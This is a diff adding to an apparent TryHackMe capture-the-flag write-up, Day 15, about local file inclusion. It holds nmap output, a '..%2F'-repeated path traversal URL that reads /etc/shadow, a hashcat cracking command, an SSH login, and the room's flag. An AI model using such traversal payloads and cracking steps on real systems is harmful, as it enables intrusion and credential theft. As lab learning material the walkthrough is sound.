@@ -583,11 +583,82 @@ what should in be in "somethinghere"?
 Elf Charlie likes to make notes and store them on his server. Are you able to take advantage of this functionality and crack his password? 
 ```
 READ [this](https://blog.tryhackme.com/lfi/)
+
+```console
+kali@kali:~$ sudo nmap -A 10.10.21.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 22:55 EDT
+Nmap scan report for 10.10.21.94
+Host is up (0.050s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 55:02:84:a1:da:8d:f2:c9:fd:ea:65:56:fe:6a:a6:89 (RSA)
+|   256 94:ad:1f:6a:ee:f4:bf:56:7e:6c:ba:1e:d2:92:ec:e6 (ECDSA)
+|_  256 c1:5d:32:10:dd:5b:01:25:dd:6b:f4:b5:52:10:c7:29 (ED25519)
+80/tcp open  http    Node.js (Express middleware)
+|_http-title: Public Notes
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=5/12%OT=22%CT=1%CU=33422%PV=Y%DS=2%DC=T%G=Y%TM=5EBB61C
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
+OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT      ADDRESS
+1   50.36 ms 10.8.0.1
+2   49.57 ms 10.10.21.94
+```
+```js
+<script>
+      function getNote(note, id) {
+        const url = '/get-file/' + note.replace(/\//g, '%2f')
+        $.getJSON(url,  function(data) {
+          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
+        })
+      }
+      // getNote('server.js', '#note-1')
+      getNote('views/notes/note1.txt', '#note-1')
+      getNote('views/notes/note2.txt', '#note-2')
+      getNote('views/notes/note3.txt', '#note-3')
+</script>
+```
+
 ## What is Charlie going to book a holiday to?
+http://10.10.21.94/get-file/views%2Fnotes%2Fnote3.txt or just read the page
 
 ## Read /etc/shadow and crack Charlies password.
+```/etc``` is at the root directory. and we are currently at ```...../get-file/....```. To move back to root terminal we need to do ``cd ..`` multiple times. So my plan is just spam ```..%2F``` like 10 time to make sure that it will end up at the root directory.
 
+
+this give us ````10.10.21.94/get-file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow```
+
+now use hashcat
+```console
+kali@kali:~$ mkdir Day15 && cd Day15
+kali@kali:~/Day15$ nano charlie.lst # add the hash
+kali@kali:~/Day15$ hashcat -m 1800 -a 0 -o charlie.txt charlie.lst /usr/share/wordlists/rockyou.txt --force
+kali@kali:~/Day15$ cat charlie.txt
+```
 ## What is flag1.txt?
+just SSH using charlie cerdential and grep the flag1.txt!!
+```console
+kali@kali:~/Day15$ ssh charlie@10.10.21.94
+charlie@ip-10-10-21-94:~$ ls
+flag1.txt
+charlie@ip-10-10-21-94:~$ cat flag1.txt 
+THM{4ea2adf842713ad3ce0c1f05ef12256d}
+```
 
 # Day 16 : File Confusion 
 ```
